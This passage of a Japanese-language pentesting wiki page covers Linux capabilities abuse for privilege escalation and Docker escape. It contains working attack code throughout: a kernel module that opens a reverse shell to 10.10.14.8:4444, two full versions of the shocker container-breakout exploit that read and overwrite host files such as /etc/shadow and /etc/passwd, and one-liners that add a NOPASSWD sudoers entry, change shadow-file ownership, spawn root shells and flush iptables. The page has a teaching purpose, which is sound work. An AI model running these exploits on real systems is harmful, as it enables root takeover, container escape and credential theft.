MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/10.10.14.8/4444 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```
{% endcode %}

{% code title="Makefile" %}
```bash
obj-m +=reverse-shell.o

all:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```
{% endcode %}

{% hint style="warning" %}
Makefile内の各makeワードの前の空白文字は、**タブでなければなりません**！
{% endhint %}

`make`を実行してコンパイルします。
```
ake[1]: *** /lib/modules/5.10.0-kali7-amd64/build: No such file or directory.  Stop.

sudo apt update
sudo apt full-upgrade
```
最後に、シェル内で`nc`を起動し、別のシェルから**モジュールをロード**して、`nc`プロセスでシェルをキャプチャします：
```bash
#Shell 1
nc -lvnp 4444

#Shell 2
insmod reverse-shell.ko #Launch the reverse shell
```
**この技術のコードは、**[**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)**の"Abusing SYS\_MODULE Capability"の実験室からコピーされました。**

この技術の別の例は、[https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host](https://www.cyberark.com/resources/threat-research-blog/how-i-hacked-play-with-docker-and-remotely-ran-code-on-the-host) で見つけることができます。

## CAP\_DAC\_READ\_SEARCH

[**CAP\_DAC\_READ\_SEARCH**](https://man7.org/linux/man-pages/man7/capabilities.7.html) は、**ファイルの読み取りとディレクトリの読み取りおよび実行の権限をバイパスする**プロセスを有効にします。主な用途はファイルの検索や読み取りです。ただし、`open_by_handle_at(2)` 関数を使用することも可能で、この関数を使用すると、プロセスのマウントネームスペースの外にあるファイルを含む任意のファイルにアクセスできます。`open_by_handle_at(2)` で使用されるハンドルは、`name_to_handle_at(2)` を介して取得される透過的でない識別子であるべきですが、inode 番号などの機密情報を含む可能性があり、改ざんの危険にさらされます。この機能の悪用の可能性は、特にDockerコンテナのコンテキストで、Sebastian Krahmerによってshocker exploitで実証され、[ここ](https://medium.com/@fun_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で分析されています。
**これは、ファイルの読み取り権限チェックとディレクトリの読み取り/実行権限チェックをバイパスできることを意味します。**

**バイナリを使用した例**

バイナリは任意のファイルを読み取ることができます。したがって、tarのようなファイルにこの機能がある場合、shadowファイルを読み取ることができます。
```bash
cd /etc
tar -czf /tmp/shadow.tar.gz shadow #Compress show file in /tmp
cd /tmp
tar -cxf shadow.tar.gz
```
**binary2を使用した例**

この場合、**`python`** バイナリにこの機能があると仮定します。ルートファイルをリストするには、次のようにします：
```python
import os
for r, d, f in os.walk('/root'):
for filename in f:
print(filename)
```
そしてファイルを読むためには、次のようにします：
```python
print(open("/etc/shadow", "r").read())
```
**環境での例（Docker脱出）**

次のコマンドを使用して、Dockerコンテナ内で有効になっている機能を確認できます：
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
前の出力で、**DAC\_READ\_SEARCH** キャパビリティが有効になっていることがわかります。その結果、コンテナは**プロセスのデバッグ**を行うことができます。

次の悪用方法については、[https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3](https://medium.com/@fun\_cuddles/docker-breakout-exploit-analysis-a274fff0e6b3)で詳細を学ぶことができますが、要約すると、**CAP\_DAC\_READ\_SEARCH**は許可チェックなしにファイルシステムをトラバースするだけでなく、_**open\_by\_handle\_at(2)**_に対するチェックも明示的に削除し、**他のプロセスが開いた機密ファイルにアクセスできる可能性**があります。

この権限を悪用してホストからファイルを読み取るオリジナルのエクスプロイトは、[http://stealth.openwall.net/xSports/shocker.c](http://stealth.openwall.net/xSports/shocker.c)で見つけることができます。以下は、**最初の引数として読み取りたいファイルを指定し、それをファイルにダンプする**ための**修正版**です。
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker.c -o shocker
// ./socker /etc/shadow shadow #Read /etc/shadow from host and save result in shadow file in current dir

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};

void die(const char *msg)
{
perror(msg);
exit(errno);
}

void dump_handle(const struct my_file_handle *h)
{
fprintf(stderr,"[*] #=%d, %d, char nh[] = {", h->handle_bytes,
h->handle_type);
for (int i = 0; i < h->handle_bytes; ++i) {
fprintf(stderr,"0x%02x", h->f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr,"\n");
if (i < h->handle_bytes - 1)
fprintf(stderr,", ");
}
fprintf(stderr,"};\n");
}

int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle
*oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR *dir = NULL;
struct dirent *de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh->f_handle, ih->f_handle, sizeof(oh->f_handle));
oh->handle_type = 1;
oh->handle_bytes = 8;
return 1;
}

++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle *)ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de->d_name);
if (strncmp(de->d_name, path, strlen(de->d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de->d_name, (int)de->d_ino);
ino = de->d_ino;
break;
}
}

fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, &ino, sizeof(ino));
memcpy(outh.f_handle + 4, &i, sizeof(i));
if ((i % (1<<20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de->d_name, i);
if (open_by_handle_at(bfd, (struct file_handle *)&outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle(&outh);
return find_handle(bfd, path, &outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}


int main(int argc,char* argv[] )
{
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {0x02, 0, 0, 0, 0, 0, 0, 0}
};

fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");

read(0, buf, 1);

// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");

if (find_handle(fd1, argv[1], &root_h, &h) <= 0)
die("[-] Cannot find valid handle!");

fprintf(stderr, "[!] Got a final handle!\n");
dump_handle(&h);

if ((fd2 = open_by_handle_at(fd1, (struct file_handle *)&h, O_RDONLY)) < 0)
die("[-] open_by_handle");

memset(buf, 0, sizeof(buf));
if (read(fd2, buf, sizeof(buf) - 1) < 0)
die("[-] read");

printf("Success!!\n");

FILE *fptr;
fptr = fopen(argv[2], "w");
fprintf(fptr,"%s", buf);
fclose(fptr);

close(fd2); close(fd1);

return 0;
}
```
{% hint style="warning" %}
エクスプロイトは、ホストにマウントされた何かのポインタを見つける必要があります。元のエクスプロイトはファイル /.dockerinit を使用していましたが、この改変版では /etc/hostname を使用しています。エクスプロイトが機能しない場合は、異なるファイルを設定する必要があるかもしれません。ホストにマウントされたファイルを見つけるには、単純に mount コマンドを実行してください：
{% endhint %}

![](<../../.gitbook/assets/image (407) (1).png>)

**このテクニックのコードは、"Abusing DAC\_READ\_SEARCH Capability" の実験室からコピーされました** [**https://www.pentesteracademy.com/**](https://www.pentesteracademy.com)

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/) は、**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの一つです。**技術的知識の促進を使命**とするこの会議は、あらゆる分野のテクノロジーとサイバーセキュリティ専門家にとっての熱い出会いの場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP\_DAC\_OVERRIDE

**これは、任意のファイルの書き込み権限チェックをバイパスできることを意味します。そのため、任意のファイルを書き込むことができます。**

**特権昇格のために上書きできるファイルがたくさんあります** [**ここからアイデアを得ることができます**](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges).

**バイナリを使用した例**

この例では、vim がこの機能を持っているため、_passwd_、_sudoers_、_shadow_ などの任意のファイルを変更できます：
```bash
getcap -r / 2>/dev/null
/usr/bin/vim = cap_dac_override+ep

vim /etc/sudoers #To overwrite it
```
**バイナリ2の例**

この例では、**`python`** バイナリにこの権限が付与されます。Pythonを使用して、任意のファイルを上書きできます。
```python
file=open("/etc/sudoers","a")
file.write("yourusername ALL=(ALL) NOPASSWD:ALL")
file.close()
```
**環境＋CAP_DAC_READ_SEARCH（Docker脱獄）の例**

次のコマンドを使用して、Dockerコンテナ内で有効な機能を確認できます：
```bash
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
まず、ホストの任意のファイルを読むためにDAC\_READ\_SEARCH機能を乱用する前のセクションを読んで、攻撃コードをコンパイルします。\
次に、ホストのファイルシステムに任意のファイルを書き込むことができるようにする、以下のshocker exploitのバージョンをコンパイルします:
```c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <dirent.h>
#include <stdint.h>

// gcc shocker_write.c -o shocker_write
// ./shocker_write /etc/passwd passwd

struct my_file_handle {
unsigned int handle_bytes;
int handle_type;
unsigned char f_handle[8];
};
void die(const char * msg) {
perror(msg);
exit(errno);
}
void dump_handle(const struct my_file_handle * h) {
fprintf(stderr, "[*] #=%d, %d, char nh[] = {", h -> handle_bytes,
h -> handle_type);
for (int i = 0; i < h -> handle_bytes; ++i) {
fprintf(stderr, "0x%02x", h -> f_handle[i]);
if ((i + 1) % 20 == 0)
fprintf(stderr, "\n");
if (i < h -> handle_bytes - 1)
fprintf(stderr, ", ");
}
fprintf(stderr, "};\n");
}
int find_handle(int bfd, const char *path, const struct my_file_handle *ih, struct my_file_handle *oh)
{
int fd;
uint32_t ino = 0;
struct my_file_handle outh = {
.handle_bytes = 8,
.handle_type = 1
};
DIR * dir = NULL;
struct dirent * de = NULL;
path = strchr(path, '/');
// recursion stops if path has been resolved
if (!path) {
memcpy(oh -> f_handle, ih -> f_handle, sizeof(oh -> f_handle));
oh -> handle_type = 1;
oh -> handle_bytes = 8;
return 1;
}
++path;
fprintf(stderr, "[*] Resolving '%s'\n", path);
if ((fd = open_by_handle_at(bfd, (struct file_handle * ) ih, O_RDONLY)) < 0)
die("[-] open_by_handle_at");
if ((dir = fdopendir(fd)) == NULL)
die("[-] fdopendir");
for (;;) {
de = readdir(dir);
if (!de)
break;
fprintf(stderr, "[*] Found %s\n", de -> d_name);
if (strncmp(de -> d_name, path, strlen(de -> d_name)) == 0) {
fprintf(stderr, "[+] Match: %s ino=%d\n", de -> d_name, (int) de -> d_ino);
ino = de -> d_ino;
break;
}
}
fprintf(stderr, "[*] Brute forcing remaining 32bit. This can take a while...\n");
if (de) {
for (uint32_t i = 0; i < 0xffffffff; ++i) {
outh.handle_bytes = 8;
outh.handle_type = 1;
memcpy(outh.f_handle, & ino, sizeof(ino));
memcpy(outh.f_handle + 4, & i, sizeof(i));
if ((i % (1 << 20)) == 0)
fprintf(stderr, "[*] (%s) Trying: 0x%08x\n", de -> d_name, i);
if (open_by_handle_at(bfd, (struct file_handle * ) & outh, 0) > 0) {
closedir(dir);
close(fd);
dump_handle( & outh);
return find_handle(bfd, path, & outh, oh);
}
}
}
closedir(dir);
close(fd);
return 0;
}
int main(int argc, char * argv[]) {
char buf[0x1000];
int fd1, fd2;
struct my_file_handle h;
struct my_file_handle root_h = {
.handle_bytes = 8,
.handle_type = 1,
.f_handle = {
0x02,
0,
0,
0,
0,
0,
0,
0
}
};
fprintf(stderr, "[***] docker VMM-container breakout Po(C) 2014 [***]\n"
"[***] The tea from the 90's kicks your sekurity again. [***]\n"
"[***] If you have pending sec consulting, I'll happily [***]\n"
"[***] forward to my friends who drink secury-tea too! [***]\n\n<enter>\n");
read(0, buf, 1);
// get a FS reference from something mounted in from outside
if ((fd1 = open("/etc/hostname", O_RDONLY)) < 0)
die("[-] open");
if (find_handle(fd1, argv[1], & root_h, & h) <= 0)
die("[-] Cannot find valid handle!");
fprintf(stderr, "[!] Got a final handle!\n");
dump_handle( & h);
if ((fd2 = open_by_handle_at(fd1, (struct file_handle * ) & h, O_RDWR)) < 0)
die("[-] open_by_handle");
char * line = NULL;
size_t len = 0;
FILE * fptr;
ssize_t read;
fptr = fopen(argv[2], "r");
while ((read = getline( & line, & len, fptr)) != -1) {
write(fd2, line, read);
}
printf("Success!!\n");
close(fd2);
close(fd1);
return 0;
}
```
Dockerコンテナから脱出するためには、ホストから`/etc/shadow`と`/etc/passwd`ファイルを**ダウンロード**し、そこに**新しいユーザー**を**追加**して、**`shocker_write`**を使用して上書きします。その後、**ssh**経由で**アクセス**します。

**このテクニックのコードは、"Abusing DAC\_OVERRIDE Capability"の実験室からコピーされました** [**https://www.pentesteracademy.com**](https://www.pentesteracademy.com)

## CAP\_CHOWN

**これは、任意のファイルの所有権を変更できることを意味します。**

**バイナリを使用した例**

たとえば、**`python`**バイナリにこの機能があるとします。**shadow**ファイルの**所有者**を**変更**し、**rootパスワード**を変更して特権を昇格させることができます。
```bash
python -c 'import os;os.chown("/etc/shadow",1000,1000)'
```
または、この機能を持つ**`ruby`**バイナリを使用しています：
```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```
## CAP\_FOWNER

**これは任意のファイルの権限を変更できることを意味します。**

**バイナリを使用した例**

もしPythonがこの機能を持っている場合、shadowファイルの権限を変更し、**rootパスワードを変更**して特権を昇格させることができます。
```bash
python -c 'import os;os.chmod("/etc/shadow",0666)
```
### CAP\_SETUID

**これは、作成されたプロセスの有効なユーザーIDを設定できる可能性があることを意味します。**

**バイナリを使用した例**

Pythonがこの**機能**を持っている場合、特権をrootに昇格させるために簡単に悪用できます。
```python
import os
os.setuid(0)
os.system("/bin/bash")
```
**別の方法:**
```python
import os
import prctl
#add the capability to the effective set
prctl.cap_effective.setuid = True
os.setuid(0)
os.system("/bin/bash")
```
## CAP\_SETGID

**これは、作成されたプロセスの有効なグループIDを設定できる可能性があることを意味します。**

特権を昇格させるために**上書きできるファイルがたくさんあります。[ここからアイデアを得ることができます](payloads-to-execute.md#overwriting-a-file-to-escalate-privileges)。**

**バイナリを使用した例**

この場合、グループが読み取り可能な興味深いファイルを探す必要があります。なぜなら、任意のグループを偽装できるからです：
```bash
#Find every file writable by a group
find / -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file writable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=w -exec ls -lLd {} \; 2>/dev/null
#Find every file readable by a group in /etc with a maxpath of 1
find /etc -maxdepth 1 -perm /g=r -exec ls -lLd {} \; 2>/dev/null
```
一度悪用できるファイルを見つけたら（読み取りまたは書き込みを介して）特定のグループを模倣してシェルを取得できます。
```python
import os
os.setgid(42)
os.system("/bin/bash")
```
次の場合、グループshadowが偽装されたため、ファイル`/etc/shadow`を読むことができます：
```bash
cat /etc/shadow
```
もし**docker**がインストールされている場合、**dockerグループ**を**なりすまして**、[**dockerソケットと権限昇格**](./#writable-docker-socket)を悪用することができます。

## CAP\_SETFCAP

これは、ファイルやプロセスに権限を設定できることを意味します。

**バイナリの例**

Pythonがこの**機能**を持っている場合、root権限に権限昇格するために簡単に悪用できます:

{% code title="setcapability.py" %}
```python
import ctypes, sys

#Load needed library
#You can find which library you need to load checking the libraries of local setcap binary
# ldd /sbin/setcap
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p,ctypes.c_void_p]

#Give setuid cap to the binary
cap = 'cap_setuid+ep'
path = sys.argv[1]
print(path)
cap_t = libcap.cap_from_text(cap)
status = libcap.cap_set_file(path,cap_t)

if(status == 0):
print (cap + " was successfully added to " + path)
```
{% endcode %}
```bash
python setcapability.py /usr/bin/python2.7
```
{% hint style="warning" %}
CAP\_SETFCAPを使用してバイナリに新しい権限を設定した場合、この権限は失われます。
{% endhint %}

[SETUID capability](linux-capabilities.md#cap\_setuid)を持っている場合は、特権を昇格する方法を確認するためにそのセクションに移動できます。

**環境を使用した例（Docker脱獄）**

デフォルトでは、**Dockerコンテナ内のプロセスにはCAP\_SETFCAP機能が与えられています**。次のような操作で確認できます：
```bash
cat /proc/`pidof bash`/status | grep Cap
CapInh: 00000000a80425fb
CapPrm: 00000000a80425fb
CapEff: 00000000a80425fb
CapBnd: 00000000a80425fb
CapAmb: 0000000000000000

capsh --decode=00000000a80425fb
0x00000000a80425fb=cap_chown,cap_dac_override,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_net_bind_service,cap_net_raw,cap_sys_chroot,cap_mknod,cap_audit_write,cap_setfcap
```
この機能を使用すると、バイナリに**他のどんな機能でも付与**できるため、このページで言及されている他の機能の脱出を悪用して、コンテナから**脱出**することが考えられます。\
ただし、例えばgdbバイナリにCAP\_SYS\_ADMINとCAP\_SYS\_PTRACEの機能を付与しようとすると、それらを付与できますが、その後**バイナリを実行することができなくなります**：
```bash
getcap /usr/bin/gdb
/usr/bin/gdb = cap_sys_ptrace,cap_sys_admin+eip

setcap cap_sys_admin,cap_sys_ptrace+eip /usr/bin/gdb

/usr/bin/gdb
bash: /usr/bin/gdb: Operation not permitted
```
[ドキュメントから](https://man7.org/linux/man-pages/man7/capabilities.7.html): _Permitted: これはスレッドが想定できる有効な機能の**制限付きのスーパーセット**です。また、有効なセットに**CAP\_SETPCAP**機能を持たないスレッドによって継承可能なセットに追加できる機能の制限付きのスーパーセットでもあります。_\
Permitted機能は使用可能な機能を制限するようです。\
ただし、Dockerはデフォルトで**CAP\_SETPCAP**を付与するため、**継承可能な機能の内部に新しい機能を設定できる**可能性があります。\
ただし、この機能のドキュメントには次のように記載されています: _CAP\_SETPCAP: \[...\] **呼び出し元スレッドのバウンディングセットから任意の機能を継承可能なセットに追加**します。_\
継承可能なセットに追加できるのは、バウンディングセットからの機能のみのようです。つまり、**CAP\_SYS\_ADMINやCAP\_SYS\_PTRACEのような新しい機能を継承セットに追加して特権を昇格させることはできません**。

## CAP\_SYS\_RAWIO

[**CAP\_SYS\_RAWIO**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`/dev/mem`、`/dev/kmem`、または`/proc/kcore`へのアクセス、`mmap_min_addr`の変更、`ioperm(2)`および`iopl(2)`システムコールへのアクセス、およびさまざまなディスクコマンドを含む、いくつかの機密操作を提供します。この機能により、`FIBMAP ioctl(2)`も有効になり、これが[過去に](http://lkml.iu.edu/hypermail/linux/kernel/9907.0/0132.html)問題を引き起こしたことがあります。マニュアルページによると、これにより、保持者は他のデバイス上で`デバイス固有の操作の範囲を実行`することもできます。

これは**特権昇格**や**Docker脱獄**に役立ちます。

## CAP\_KILL

**これは任意のプロセスを終了できる可能性があることを意味します。**

**バイナリを使用した例**

たとえば、**`python`**バイナリにこの機能があるとします。もし、**いくつかのサービスやソケットの設定**（またはサービスに関連する構成ファイル）を変更できる場合、それにバックドアを仕込んで、そのサービスに関連するプロセスを終了し、新しい構成ファイルがバックドアを実行するのを待つことができます。
```python
#Use this python code to kill arbitrary processes
import os
import signal
pgid = os.getpgid(341)
os.killpg(pgid, signal.SIGKILL)
```
**killを使用した権限昇格**

もしkillの機能を持っていて、**rootとして実行されているノードプログラム**（または異なるユーザーとして）がある場合、おそらくそれに**シグナルSIGUSR1**を**送信**して、**ノードデバッガーを開く**ようにさせることができます。
```bash
kill -s SIGUSR1 <nodejs-ps>
# After an URL to access the debugger will appear. e.g. ws://127.0.0.1:9229/45ea962a-29dd-4cdd-be08-a6827840553d
```
{% content-ref url="electron-cef-chromium-debugger-abuse.md" %}
[electron-cef-chromium-debugger-abuse.md](electron-cef-chromium-debugger-abuse.md)
{% endcontent-ref %}

​

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)は**スペイン**で最も関連性の高いサイバーセキュリティイベントであり、**ヨーロッパ**でも最も重要なイベントの1つです。**技術知識の促進を使命として**、この会議はあらゆる分野の技術とサイバーセキュリティ専門家にとって沸騰する出会いの場です。

{% embed url="https://www.rootedcon.com/" %}

## CAP_NET_BIND_SERVICE

**これは、任意のポートでリッスンすることが可能であることを意味します。** この機能を使用して特権を直接昇格することはできません。

**バイナリを使用した例**

もし**`python`**がこの機能を持っている場合、任意のポートでリッスンし、他の任意のポートに接続することができます（一部のサービスは特定の特権ポートからの接続を必要とします）

{% tabs %}
{% tab title="リッスン" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0', 80))
s.listen(1)
conn, addr = s.accept()
while True:
output = connection.recv(1024).strip();
print(output)
```
{% endtab %}

{% tab title="接続" %}
```python
import socket
s=socket.socket()
s.bind(('0.0.0.0',500))
s.connect(('10.10.10.10',500))
```
{% endtab %}
{% endtabs %}

## CAP\_NET\_RAW

[**CAP\_NET\_RAW**](https://man7.org/linux/man-pages/man7/capabilities.7.html)機能はプロセスが**RAWおよびPACKETソケットを作成**することを許可し、任意のネットワークパケットを生成および送信できるようにします。これはコンテナ化された環境においてセキュリティリスクを引き起こす可能性があり、パケットのスプーフィング、トラフィックのインジェクション、ネットワークアクセス制御の回避などが挙げられます。悪意のある行為者はこれを悪用してコンテナのルーティングに干渉したり、適切なファイアウォール保護がない場合にはホストネットワークセキュリティを危険にさらす可能性があります。さらに、**CAP_NET_RAW**は特権コンテナがRAW ICMPリクエストを介してpingなどの操作をサポートするために重要です。

**これはトラフィックを嗅視することが可能であることを意味します。** この機能を直接使用して特権を昇格させることはできません。

**バイナリを使用した例**

バイナリ**`tcpdump`**がこの機能を持っている場合、ネットワーク情報をキャプチャするために使用できます。
```bash
getcap -r / 2>/dev/null
/usr/sbin/tcpdump = cap_net_raw+ep
```
注意すべきは、**環境**がこの機能を提供している場合、**`tcpdump`**を使用してトラフィックをスニッフすることもできることです。

**バイナリ2の例**

以下の例は、"**lo**" (**localhost**) インターフェースのトラフィックを傍受するのに役立つ**`python2`**コードです。このコードは、[https://attackdefense.pentesteracademy.com/](https://attackdefense.pentesteracademy.com)のラボ "_The Basics: CAP-NET\_BIND + NET\_RAW_" から取得したものです。
```python
import socket
import struct

flags=["NS","CWR","ECE","URG","ACK","PSH","RST","SYN","FIN"]

def getFlag(flag_value):
flag=""
for i in xrange(8,-1,-1):
if( flag_value & 1 <<i ):
flag= flag + flags[8-i] + ","
return flag[:-1]

s = socket.socket(socket.AF_PACKET, socket.SOCK_RAW, socket.htons(3))
s.setsockopt(socket.SOL_SOCKET, socket.SO_RCVBUF, 2**30)
s.bind(("lo",0x0003))

flag=""
count=0
while True:
frame=s.recv(4096)
ip_header=struct.unpack("!BBHHHBBH4s4s",frame[14:34])
proto=ip_header[6]
ip_header_size = (ip_header[0] & 0b1111) * 4
if(proto==6):
protocol="TCP"
tcp_header_packed = frame[ 14 + ip_header_size : 34 + ip_header_size]
tcp_header = struct.unpack("!HHLLHHHH", tcp_header_packed)
dst_port=tcp_header[0]
src_port=tcp_header[1]
flag=" FLAGS: "+getFlag(tcp_header[4])

elif(proto==17):
protocol="UDP"
udp_header_packed_ports = frame[ 14 + ip_header_size : 18 + ip_header_size]
udp_header_ports=struct.unpack("!HH",udp_header_packed_ports)
dst_port=udp_header[0]
src_port=udp_header[1]

if (proto == 17 or proto == 6):
print("Packet: " + str(count) + " Protocol: " + protocol + " Destination Port: " + str(dst_port) + " Source Port: " + str(src_port) + flag)
count=count+1
```
## CAP_NET_ADMIN + CAP_NET_RAW

[**CAP_NET_ADMIN**](https://man7.org/linux/man-pages/man7/capabilities.7.html)機能は、ネットワーク構成を変更する権限を持ちます。これには、ファイアウォール設定、ルーティングテーブル、ソケットの権限、および公開されたネットワーク名前空間内のネットワークインターフェース設定を含みます。また、ネットワークインターフェースで**プロミスキャスモード**を有効にすることも可能であり、名前空間全体でパケットスニッフィングを行うことができます。

**バイナリを使用した例**

たとえば、**pythonバイナリ**がこれらの機能を持っているとします。
```python
#Dump iptables filter table rules
import iptc
import pprint
json=iptc.easy.dump_table('filter',ipv6=False)
pprint.pprint(json)

#Flush iptables filter table
import iptc
iptc.easy.flush_table('filter')
```
## CAP\_LINUX\_IMMUTABLE

**これはinode属性を変更できることを意味します。** この機能では特権を直接昇格することはできません。

**バイナリを使用した例**

ファイルがimmutableであり、pythonがこの機能を持っている場合、**immutable属性を削除してファイルを変更可能にできます:**
```python
#Check that the file is imutable
lsattr file.sh
----i---------e--- backup.sh
```

```python
#Pyhton code to allow modifications to the file
import fcntl
import os
import struct

FS_APPEND_FL = 0x00000020
FS_IOC_SETFLAGS = 0x40086602

fd = os.open('/path/to/file.sh', os.O_RDONLY)
f = struct.pack('i', FS_APPEND_FL)
fcntl.ioctl(fd, FS_IOC_SETFLAGS, f)

f=open("/path/to/file.sh",'a+')
f.write('New content for the file\n')
```
{% hint style="info" %}
通常、この不変属性は次のように設定および削除されます：
```bash
sudo chattr +i file.txt
sudo chattr -i file.txt
```
{% endhint %}

## CAP\_SYS\_CHROOT

[**CAP\_SYS\_CHROOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、`chroot(2)`システムコールの実行を可能にし、既知の脆弱性を介して`chroot(2)`環境からの脱出を許可する可能性があります：

- [さまざまなchrootソリューションからの脱出方法](https://deepsec.net/docs/Slides/2015/Chw00t\_How\_To\_Break%20Out\_from\_Various\_Chroot\_Solutions\_-\_Bucsay\_Balazs.pdf)
- [chw00t: chroot脱出ツール](https://github.com/earthquake/chw00t/)

## CAP\_SYS\_BOOT

[**CAP\_SYS\_BOOT**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、システム再起動のための`reboot(2)`システムコールの実行を許可するだけでなく、特定のハードウェアプラットフォーム向けに調整された`LINUX_REBOOT_CMD_RESTART2`などの特定のコマンドを含むシステム再起動を可能にします。また、Linux 3.17以降では、新しいまたは署名されたクラッシュカーネルをロードするための`kexec_load(2)`および`kexec_file_load(2)`の使用も可能にします。

## CAP\_SYSLOG

[**CAP\_SYSLOG**](https://man7.org/linux/man-pages/man7/capabilities.7.html)は、Linux 2.6.37で広範な**CAP_SYS_ADMIN**から分離され、具体的に`syslog(2)`呼び出しの使用を許可します。この機能により、`kptr_restrict`設定が1の場合、カーネルアドレスを`/proc`および類似のインターフェースから表示できます。`kptr_restrict`のデフォルトはLinux 2.6.39以降、0であり、カーネルアドレスが公開されることを意味しますが、多くのディストリビューションはセキュリティ上の理由からこれを1（uid 0以外のアドレスを非表示にする）または2（常にアドレスを非表示にする）に設定しています。

